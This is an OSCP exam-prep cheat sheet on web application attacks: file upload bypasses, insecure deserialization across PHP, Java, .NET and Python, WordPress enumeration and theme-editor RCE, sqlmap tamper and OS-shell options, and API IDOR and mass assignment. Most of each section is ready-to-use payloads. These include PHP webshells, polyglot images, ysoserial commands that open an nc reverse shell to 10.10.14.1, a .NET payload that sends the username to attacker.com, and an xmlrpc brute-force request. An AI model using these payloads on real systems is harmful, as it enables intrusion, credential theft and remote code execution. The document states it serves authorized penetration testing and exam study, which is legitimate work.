# OSCP-Relevant Web Application Attack Techniques (Beyond OWASP Basics)

*For authorized pentest/exam prep only — techniques and payloads below assume you have explicit written authorization to test the target.*

---

## 1. File Upload Bypass Techniques

### 1.1 Extension Bypass
**Explanation:** When a blacklist filters `.php`, try alternate extensions that the web server (Apache/nginx via misconfigured handlers) still executes as PHP, or use case/double-extension tricks against naive filters.

**Example payloads:**
```
shell.php5
shell.phtml
shell.pht
shell.phar
shell.PHP        # case bypass on case-insensitive checks
shell.php.jpg    # double extension, works if app parses first ext, server executes last
shell.php%00.jpg # null-byte truncation (legacy PHP < 5.3.4)
shell.php.       # trailing dot, stripped by some OS/filesystems
shell.pHp
```
Also try uploading `.htaccess` first (if uploads dir allows it) to remap an allowed extension to PHP:
```apache
AddType application/x-httpd-php .jpg
```

**Reference:** https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md

---

### 1.2 Content-Type / MIME Bypass
**Explanation:** Server-side checks often only validate the `Content-Type` header of the multipart form part, not the actual file content. Simply edit the header client-side (Burp) to match an allowed type.

**Example (Burp Repeater / curl):**
```bash
curl -X POST http://target/upload.php \
  -F "file=@shell.php;type=image/jpeg;filename=shell.php"
```
In Burp, intercept the upload request and change:
```
Content-Type: application/x-php
```
to
```
Content-Type: image/jpeg
```
while keeping the malicious PHP content and `.php` filename (or a whitelisted extension via other bypass).

**Reference:** https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md

---

### 1.3 Magic Byte / Content Validation Bypass
**Explanation:** Some apps check the first bytes of a file (magic numbers) to "verify" it's really an image, then still serve/execute it based on extension. Prepend valid magic bytes to your payload, or embed PHP inside an actual valid image (polyglot, see 1.4).

**Example — prepend GIF magic bytes to a PHP shell:**
```bash
echo -n 'GIF89a;' > shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php
```
This passes `getimagesize()`/`file` magic-byte checks that look for `GIF8` while the file is still parsed as PHP if the server executes `.php`.

**Reference:** https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html

---

### 1.4 Polyglot Files (valid image + embedded PHP)
**Explanation:** Craft a file that is simultaneously a valid image (passes `getimagesize`, EXIF checks, even re-rendering in some cases) AND contains executable PHP, useful when the app allows `.php` extension but validates the file is "really" an image, or when combined with a Local File Inclusion to execute an "image".

**Example — embed payload in JPEG EXIF comment field with exiftool:**
```bash
cp innocent.jpg shell.jpg
exiftool -Comment='<?php system($_GET["cmd"]); ?>' shell.jpg
# Upload as shell.jpg, then trigger via LFI:
# http://target/index.php?page=uploads/shell.jpg
```
**Example — append PHP after valid JPEG binary (works if server just concatenates/serves as PHP):**
```bash
cat innocent.jpg shell.php > polyglot.php.jpg
```

**Reference:** https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Picture%20Metadata/README.md

---

### 1.5a Additional Bypass Patterns

- **IIS semicolon trick**: `shell.asp;.jpg` — IIS treats everything before `;` as the parsed extension, executing as ASP while some filters only check the suffix.
- **PNG IDAT chunk embedding**: hide a PHP shell inside the IDAT chunk to survive `imagecopyresized`/`imagecopyresampled` re-encoding.
- **Path traversal via filename**: `../../var/www/html/shell.php` in the filename field to write outside the intended upload directory.
- **Command injection via filename**: filenames like `` $(whoami).jpg `` or backtick-based names, relevant when the filename is later passed unsanitized to a shell command (e.g. ImageMagick/exiftool processing).
- **Vulnerable image processors**: exiftool 7.44–12.23 RCE via crafted DjVu file metadata (CVE-2021-22204) when uploaded images are processed server-side.

**Reference:** https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html · https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md

---

### 1.5 .htaccess / Config-file Upload Attack
**Explanation:** If the upload directory permits `.htaccess` (Apache) and doesn't restrict it, upload one that reinterprets a "safe" extension as PHP, then upload the payload with that extension.

**Example:**
```apache
# .htaccess
AddType application/x-httpd-php .jpg
```
then upload `shell.jpg` containing PHP code.

**Reference:** https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess/README.md

---

### 1.6 Race Condition (TOCTOU) Upload Bypass
**Explanation:** Some apps write the uploaded file to a web-accessible path first, then validate its content (extension/magic-bytes/AV scan) afterward and delete it if it fails — a time-of-check-to-time-of-use gap. Repeatedly requesting the predicted URL while re-uploading can catch the file during the brief window it's live and execute it before it's removed.

**Example — parallel upload + request race:**
```bash
# Terminal 1: hammer the predicted URL as fast as possible
while true; do curl -s -o /dev/null -w "%{http_code}\n" "http://target/uploads/shell.php?cmd=id"; done

# Terminal 2: repeatedly (re-)upload the same file
while true; do curl -s -F "file=@shell.php" http://target/upload.php > /dev/null; done
```
Or use Burp Intruder/Turbo Intruder with the "null payload" attack type sending the upload and the trigger request as close together as possible (same connection / HTTP/2 single-packet attack) for a tighter race window.

**Reference:** https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html · https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md

---

## 2. Insecure Deserialization Basics

### 2.1 PHP Object Injection (POP chains)
**Explanation:** PHP's `unserialize()` on attacker-controlled input can instantiate arbitrary objects and trigger "magic methods" (`__wakeup`, `__destruct`, `__toString`, etc.). If the app (or a loaded library/framework) has a class whose magic method performs a dangerous action (file write, `eval`, SQL query), you chain object properties to reach it — a "POP chain" (Property-Oriented Programming).

**Example — basic PHP object injection payload:**
```php
<?php
class VulnClass {
    public $cmd;
}
$obj = new VulnClass();
$obj->cmd = "system('id');";
echo serialize($obj);
// O:9:"VulnClass":1:{s:3:"cmd";s:14:"system('id');";}
?>
```
Send this serialized string wherever the app calls `unserialize($_COOKIE['data'])` or similar. For real targets, use **PHPGGC** (PHP Generic Gadget Chains) to auto-generate gadget chains for known frameworks (Laravel, Symfony, WordPress plugins, Monolog, Guzzle, etc.):
```bash
phpggc Monolog/RCE1 system id -b
# -b outputs base64-encoded payload ready for cookie/param injection
```
Also check for **phar:// deserialization** — even functions like `file_exists()`, `file_get_contents()` on a `phar://` stream trigger unserialize of the phar's metadata:
```bash
curl "http://target/index.php?file=phar://uploads/shell.jpg/test.txt"
```

**Reference:** https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/PHP.md
**Reference (phar):** https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/phar-deserialization.html

---

### 2.2 Java Deserialization (ysoserial)
**Explanation:** Java apps that call `ObjectInputStream.readObject()` on untrusted data (common in RMI, JMX, HTTP params, cookies of frameworks like older Jenkins, WebLogic, JBoss) can be exploited by crafting a serialized object graph that triggers RCE via known "gadget chains" in classpath libraries (Commons-Collections, Spring, Groovy, etc.). **ysoserial** generates these automatically.

**Example:**
```bash
java -jar ysoserial.jar CommonsCollections6 'nc -e /bin/bash 10.10.14.1 4444' > payload.bin

# Send raw serialized bytes to a vulnerable endpoint, e.g. via base64 in a param:
base64 -w0 payload.bin

# Or use ysoserial with a specific transport helper, e.g. against WebLogic T3:
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 4444 CommonsCollections6 'nc -e /bin/bash 10.10.14.1 4444'
```
Look for serialized Java magic bytes in traffic/cookies to spot candidates: `AC ED 00 05` (hex) or `rO0` (base64-encoded start).

**Reference:** https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Java.md

---

### 2.2b .NET / ASP.NET ViewState Deserialization (ysoserial.net)
**Explanation:** .NET port of ysoserial targeting `BinaryFormatter`/`ObjectStateFormatter` (ViewState). Exploiting `__VIEWSTATE` often requires the target's machine key (`validationKey`/`decryptionKey`) — recover leaked/default keys with **Blacklist3r** first. Pre-.NET 4.5 apps may accept an unencrypted `__VIEWSTATE` even with `ViewStateEncryptionMode=Always` if `__VIEWSTATEENCRYPTED` is stripped from the request.

**Example:**
```
ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName"

# -p ViewState is the plugin that crafts a full __VIEWSTATE payload once a machine key is known;
# it requires the recovered key/algorithm params below, not just "-p ViewState" on its own:
ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "whoami" --apppath="/" --path="/default.aspx" \
  --decryptionalg="AES" --decryptionkey="<DECRYPTION_KEY>" --validationalg="SHA1" --validationkey="<VALIDATION_KEY>"
```

**Reference:** https://github.com/pwntester/ysoserial.net · https://github.com/NotSoSecure/Blacklist3r (machine-key recovery) · https://www.claranet.com/us/blog/2019-06-13-exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserialnet

---

### 2.3 Python Pickle Deserialization
**Explanation:** Python's `pickle.loads()` on untrusted data executes arbitrary code via the `__reduce__` method during unpickling — no gadget chain hunting required, you write the payload directly.

**Example:**
```python
import pickle, os, base64

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(Exploit())
print(base64.b64encode(payload).decode())
```
Deliver the base64/pickled blob wherever the app unpickles user input (session cookies signed with a leaked secret, cache backends like Redis/memcached, `pickle.load()` on uploaded files). Also watch for **PyYAML** `yaml.load()` (unsafe, vs `yaml.safe_load()`) which has similar RCE via `!!python/object/apply`.

**Example YAML payload:**
```yaml
!!python/object/apply:os.system ["id"]
```

**Reference:** https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Python.md

---

## 3. WordPress-Specific Enumeration & Exploitation

### 3.1 Manual Enumeration (no tools)
**Explanation:** Confirm WordPress and pull version/plugin/theme/user info via predictable paths before running heavier tools.

**Example:**
```bash
curl -s http://target/wp-login.php -o /dev/null -w "%{http_code}\n"
curl -s http://target/readme.html | grep -i version
curl -s http://target/wp-content/themes/ | grep -oP 'href="\K[^"]+'
curl -s "http://target/wp-json/wp/v2/users" | jq        # REST API user disclosure
curl -s "http://target/?author=1" -I                    # author enum via redirect (Location header)
curl -s http://target/xmlrpc.php -X POST -d '<methodCall><methodName>system.listMethods</methodName></methodCall>'
```

**xmlrpc.php `system.multicall` brute-force (bypasses per-request lockout/rate-limiting):**
Bundles many `wp.getUsersBlogs` login attempts into a single HTTP request, so hundreds of credential guesses count as one hit to naive lockout plugins.
```bash
curl -s http://target/xmlrpc.php -X POST -d '<?xml version="1.0"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params><param><value><array><data>
    <value><struct>
      <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
      <member><name>params</name><value><array><data>
        <value><string>admin</string></value>
        <value><string>password1</string></value>
      </data></array></value></member>
    </struct></value>
    <value><struct>
      <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
      <member><name>params</name><value><array><data>
        <value><string>admin</string></value>
        <value><string>password2</string></value>
      </data></array></value></member>
    </struct></value>
  </data></array></param></params>
</methodCall>'
# A successful pair returns blog data instead of a faultCode/faultString struct.
# wpscan supports the same idea directly:
wpscan --url http://target -U admin -P wordlist.txt --password-attack xmlrpc-multicall
```
Secondary use: `pingback.ping` on xmlrpc.php can be abused for SSRF/internal port scanning via the `pingback.ping` method.

**Reference:** https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/wordpress.html

---

### 3.2 WPScan Usage
**Explanation:** WPScan is the standard OSCP-relevant tool for automated WordPress enumeration — version, plugins, themes, users, and known CVEs (via WPVulnDB/WPScan API token, free tier available).

**Example:**
```bash
# Basic enumeration: users, vulnerable plugins/themes, version
wpscan --url http://target --enumerate vp,vt,u --api-token <YOUR_TOKEN>

# Aggressive plugin enumeration (slower, more thorough)
wpscan --url http://target --enumerate ap --plugins-detection aggressive

# Password brute-force against known usernames
wpscan --url http://target -U admin -P /usr/share/wordlists/rockyou.txt

# Just grab the WP version + confirm it's WordPress
wpscan --url http://target --no-update
```

**Reference:** https://github.com/wpscanteam/wpscan (usage docs); enumeration methodology cross-ref: https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/wordpress.html

---

### 3.2b Authenticated RCE via Theme/Plugin Editor
**Explanation:** Once valid wp-admin credentials are obtained (cracked via 3.2, found in a config/backup, or reused from another service), the fastest OSCP path to a shell is the built-in Theme/Plugin Editor — no plugin CVE required. Requires the logged-in user to hold the `edit_themes`/`edit_plugins` capability (default for Administrator) and that `DISALLOW_FILE_EDIT` is not set in `wp-config.php`.

**Steps:**
```
1. Log in at http://target/wp-login.php with recovered creds.
2. Navigate to Appearance > Theme Editor (wp-admin/theme-editor.php).
3. Select an INACTIVE theme (avoid breaking the live site) from the theme dropdown.
4. Pick a template that's reachable without auth, e.g. 404.php, and overwrite it with a PHP webshell:
   <?php system($_GET['cmd']); ?>
5. Click "Update File" (saves directly, no upload/AV checks).
6. Trigger it:
   curl "http://target/wp-content/themes/<theme-slug>/404.php?cmd=id"
```
Same technique applies to Plugins > Plugin Editor (`wp-admin/plugin-editor.php`) — edit any inactive/active plugin's PHP file the same way; useful when theme editing is disabled but plugin editing isn't (or vice versa).

**Reference:** https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CMS%20-%20WordPress%20Pentest/README.md · https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/wordpress.html

---

### 3.3 Plugin-Vulnerability Exploitation Workflow
**Explanation:** Once wpscan identifies a vulnerable plugin+version, the standard OSCP workflow is: confirm exact version → search Exploit-DB/searchsploit/WPScan vuln DB for a matching CVE/PoC → adapt PoC to target → execute (commonly SQLi, arbitrary file upload, or auth bypass leading to RCE via plugin functionality).

**Example:**
```bash
# 1. Confirm plugin + version already found by wpscan, e.g. "revslider 4.1.4"
searchsploit revslider
searchsploit -m php/webapps/xxxxx.py   # mirror/copy the PoC locally

# 2. Common revslider arbitrary file download/upload example pattern:
curl "http://target/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php"

# 3. If plugin has an authenticated file-upload feature abused for RCE,
#    upload a PHP webshell through the plugin's own upload endpoint,
#    then trigger it directly (uploads dir is usually not execution-restricted on default installs):
curl -F "file=@shell.php" http://target/wp-content/plugins/vulnplugin/upload.php
curl "http://target/wp-content/uploads/shell.php?cmd=id"
```
Also check `wp-config.php` backups/exposure (`wp-config.php.bak`, `.old`, `~`) for DB creds that may be reused (SSH/DB pivot) — a very common OSCP box pattern.

**Reference:** https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CMS%20-%20WordPress%20Pentest/README.md

---

### 3.4 droopescan — Drupal / Silverstripe scanner (non-WordPress CMS)
**Explanation:** Plugin-based scanner similar in spirit to WPScan but for Drupal (and Silverstripe, Joomla via plugin support) — use when WPScan doesn't apply.

**Example:**
```bash
pip install droopescan
droopescan scan drupal -u http://target.com/         # basic Drupal scan
droopescan scan -u http://target.com/                 # generic autodetect across supported CMSs
droopescan scan drupal -u http://target.com/ -t 8 -o json   # threaded, JSON output
```
**Reference:** https://github.com/droope/droopescan

---

## 4. Generic CMS / Framework Fingerprinting Workflow

**Explanation:** Before attacking any web app, identify the underlying CMS/framework, exact version, and technology stack — this drives which exploit databases and technique sets (WordPress plugin CVEs vs Joomla component CVEs vs Drupalgeddon vs a custom framework) to pursue next. This is a standard early step in the OSCP web methodology.

**Workflow & example commands:**
```bash
# 1. Passive header/tech fingerprint
whatweb -a 3 http://target
curl -sI http://target                        # Server, X-Powered-By headers

# 2. Automated broad fingerprint (covers WP, Joomla, Drupal, Magento, etc.)
python3 cmseek.py -u http://target             # or: cmseek -u http://target

# 3. Nikto for quick generic misconfig/version banner sweep
nikto -h http://target

# 4. Wappalyzer-equivalent via httpx (fast, good for scoping multiple hosts)
echo http://target | httpx -tech-detect -title -status-code

# 5. CMS-specific confirmation once a candidate is suspected
curl -s http://target/CHANGELOG.txt | head       # Drupal
curl -s http://target/administrator/manifests/files/joomla.xml   # Joomla
curl -s http://target/readme.html | grep -i version               # WordPress

# 6. Directory/file brute-force to reveal framework artifacts
gobuster dir -u http://target -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt,bak,zip

# 7. Once CMS + version confirmed, pivot to exploit search
searchsploit <cms name> <version>
```
General rule of thumb for the exam: fingerprint → version-pin → searchsploit/CVE lookup → confirm PoC applicability against the exact version before firing exploits blindly.

**Reference:** https://book.hacktricks.wiki/en/pentesting-web/web-vulnerabilities-methodology.html
**Reference (CMSeeK):** https://github.com/Tuhinshubhra/CMSeeK

---

### 4.1 VulnX — Multi-CMS Fingerprinting (WordPress/Joomla/Drupal/PrestaShop/OpenCart/Magento/Lokomedia)
**Explanation:** VulnX is an actively-maintained (v1.9, 320+ commits) multi-CMS scanner — broader than wpscan/droopescan/CMSeeK in that one tool covers WordPress, Joomla, Drupal, PrestaShop, OpenCart, Magento, and Lokomedia detection plus domain/web/port recon in a single pass. Use its enumeration flags as a fast multi-CMS alternative/supplement to step 2 of the workflow above, or once a candidate CMS is already suspected.

**Install:**
```bash
git clone https://github.com/anouarbensaad/vulnx.git
cd vulnx
pip install -r requirements.txt        # deps: requests, bs4
python3 vulnx.py -u http://target -c all
# or the repo's own installer (requires root; installs system-wide to /usr/local/bin/vulnx):
# chmod +x install.sh && sudo ./install.sh
```

**Enumeration-only usage:**
```bash
vulnx -u http://target -c all              # CMS fingerprint: type, version, themes, plugins, users
vulnx -u http://target -d -w               # -d: subdomain/domain info gathering, -w: web info (headers/tech)
vulnx -u http://target -p                  # port scan
vulnx -u http://target --dns               # DNS record collection
vulnx -D <dork>                            # search Google dorks for CMS instances (OSINT, no direct target contact)
vulnx --list-dorks                         # list built-in dork categories
```
- `-c/--cms-info` — identifies CMS type/version and enumerates themes, plugins, and users (multi-CMS equivalent of wpscan's `--enumerate vp,vt,u`)
- `-d/--domain-info` — subdomain gathering against the target's domain
- `-w/--web-info` — general web/header/tech info gathering
- `-p/--ports` — port scan of the target
- `--dns` — DNS record enumeration
- `-D/--dorks` — Google dork search for the target CMS (passive/OSINT)

All of the above are pure fingerprinting/enumeration — same risk profile as whatweb/wpscan/CMSeeK, and exam-safe.

**Exam caveat:** `-e/--exploit` is documented by VulnX's own README, which describes the tool itself as an "intelligent Bot... Shell can achieve automatic injection" — the flag searches for a vulnerability matching the fingerprinted CMS/version and automatically runs the exploit/drops a shell, with no human decision point in between. This is squarely OffSec's banned "Automatic exploitation tools (e.g., db_autopwn, SQLmap, etc.)" category — never use `-e`/`--exploit` on the OSCP exam. Treat it as reference-only: fingerprint with `-c`/`-d`/`-w` as above, then take the confirmed CMS+version to searchsploit/CVE lookup and a manually-applied PoC per the workflow in §4 — same discipline as the sqlmap (§5) and tplmap (`web-core-vulnerabilities.md` §7.7) `--os-shell`/`--os-cmd` caveats.

**Reference:** https://github.com/anouarbensaad/vulnx

---

## 5. sqlmap — Tamper Scripts & Shell Escalation

**Explanation:** Beyond `-u`/`--dbs`, sqlmap's tamper scripts rewrite the injection payload (encoding, comment insertion, casing tricks) to evade naive filters/WAFs, and the `--os-shell`/`--sql-shell` flags turn a confirmed injection into OS-level access where DBMS privileges allow it. **SQLmap is named explicitly in OffSec's restricted-tool list** ("Automatic exploitation tools (e.g., db_autopwn, SQLmap, etc.)"). The safe play is to leave it off the exam box entirely and do the injection by hand — see [`EXAM-TIPS.md`](../EXAM-TIPS.md) §6 for the full rationale. **Treat the commands below as lab/engagement reference only.**

**Tamper scripts for filter/WAF evasion** (chain multiple with commas):
```bash
sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3 --tamper=space2comment,charencode,between,randomcase
```
- `space2comment.py` — replaces spaces with `/**/` to defeat naive space filters
- `apostrophemask.py` — replaces `'` with its UTF-8 full-width equivalent to bypass apostrophe blacklists
- `charencode.py` / `chardoubleencode.py` — URL-encode (or double-encode) payload characters
- `between.py` — replaces `>`/`<` comparisons with `NOT BETWEEN 0 AND #` constructs
- Full list (~60 scripts): https://svn.sqlmap.org/sqlmap/trunk/sqlmap/tamper/

**Enumeration and shell escalation:**
```bash
sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3 --dbs                        # full enumeration pass
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump                       # dump a table
sqlmap -u "http://target.com/page?id=1" --sql-shell                                     # interactive SQL shell
sqlmap -u "http://target.com/page?id=1" --os-cmd whoami                                 # BANNED on OSCP exam — fully-automated OS-shell spawning, reference-only
sqlmap -u "http://target.com/page?id=1" --os-shell                                      # BANNED on OSCP exam — same restriction; needs MySQL FILE priv or MSSQL xp_cmdshell etc.
sqlmap -u "http://target.com/search" --data="param1=blah&param2=blah" --cookie="JSESSIONID=..." -p param1 --level=5 --risk=3   # POST/cookie-based, target a specific param
```
**Exam caveat:** OffSec names SQLmap as a whole in the restricted-tool list, not specific flags. The safe play is to avoid it entirely on exam day — do SQL injection by hand (see [`EXAM-TIPS.md`](../EXAM-TIPS.md) §6). For OS-level access from a confirmed injection, use hand-crafted `SELECT ... INTO OUTFILE`, `xp_cmdshell` enabled/invoked manually, etc. — never `--os-shell`/`--os-cmd`.

**Reference:** https://github.com/sqlmapproject/sqlmap · https://svn.sqlmap.org/sqlmap/trunk/sqlmap/tamper/

---

## 6. API Testing Methodology (REST / IDOR / Verb Tampering)

### 6.1 API Endpoint Discovery
**Explanation:** Modern web apps often expose REST API endpoints that are less hardened than the main UI — hidden admin endpoints, debug routes, and older API versions (`/api/v1/` alongside `/api/v2/`) are common on OSCP boxes.

**Discovery techniques:**
```bash
# Common API path brute-force
gobuster dir -u http://target -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
gobuster dir -u http://target/api -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt

# Check for API documentation endpoints
curl -s http://target/swagger.json
curl -s http://target/openapi.json
curl -s http://target/api-docs
curl -s http://target/.well-known/openapi.json
curl -s http://target/swagger/v1/swagger.json
curl -s http://target/v2/api-docs          # Spring Boot Swagger

# Enumerate API versions
curl -s http://target/api/v1/users
curl -s http://target/api/v2/users
```

### 6.2 HTTP Verb Tampering
**Explanation:** Access controls often only check `GET`/`POST`. Try other verbs against restricted endpoints — `PUT`, `DELETE`, `PATCH`, and `OPTIONS` may bypass authorization checks.
```bash
# Test all common verbs against a restricted endpoint
for verb in GET POST PUT DELETE PATCH OPTIONS HEAD; do
    echo "--- $verb ---"
    curl -s -o /dev/null -w "%{http_code}" -X $verb http://target/api/admin/users
    echo
done
```

### 6.3 IDOR (Insecure Direct Object Reference)
**Explanation:** When the API uses predictable identifiers (numeric IDs, sequential UUIDs) in URLs or request bodies, test for horizontal privilege escalation by changing the ID to another user's resource.
```bash
# Numeric ID enumeration
curl -s -H "Authorization: Bearer <YOUR_TOKEN>" http://target/api/users/1
curl -s -H "Authorization: Bearer <YOUR_TOKEN>" http://target/api/users/2    # another user's data?

# Test in request body (POST/PUT)
curl -s -X PUT -H "Content-Type: application/json" -H "Authorization: Bearer <TOKEN>" \
    -d '{"id": 2, "role": "admin"}' http://target/api/users/2    # mass assignment / role change

# GUID/UUID — check if sequential or predictable
# If you see UUIDs in responses for your own objects, try decrementing/incrementing
```

### 6.4 Mass Assignment / Parameter Pollution
**Explanation:** Send extra fields in a request body that the API doesn't expect from your role — some frameworks auto-bind all JSON keys to the model, so adding `"role": "admin"` or `"isAdmin": true` can escalate privileges.
```bash
# Registration endpoint — try adding role/privilege fields
curl -X POST http://target/api/register -H "Content-Type: application/json" \
    -d '{"username": "test", "password": "test", "role": "admin"}'

# Profile update — try adding fields not shown in the UI
curl -X PUT http://target/api/profile -H "Authorization: Bearer <TOKEN>" \
    -H "Content-Type: application/json" \
    -d '{"name": "test", "isAdmin": true, "credits": 9999}'
```

**Reference:** https://book.hacktricks.wiki/en/pentesting-web/idor.html · https://owasp.org/API-Security/

---

### Consolidated Reference List
- File Upload: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md
- File Upload (HackTricks): https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html
- Insecure Deserialization (index): https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization
- PHP Deserialization: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/PHP.md
- Java Deserialization: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Java.md
- Python Deserialization: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Python.md
- HackTricks Deserialization (index): https://hacktricks.wiki/en/pentesting-web/deserialization/index.html
- WordPress Pentest (HackTricks): https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/wordpress.html
- WordPress Pentest (PayloadsAllTheThings): https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CMS%20-%20WordPress%20Pentest/README.md
- WPScan: https://github.com/wpscanteam/wpscan
- Web Vulnerability Methodology (HackTricks): https://book.hacktricks.wiki/en/pentesting-web/web-vulnerabilities-methodology.html
- CMSeeK: https://github.com/Tuhinshubhra/CMSeeK
- VulnX: https://github.com/anouarbensaad/vulnx
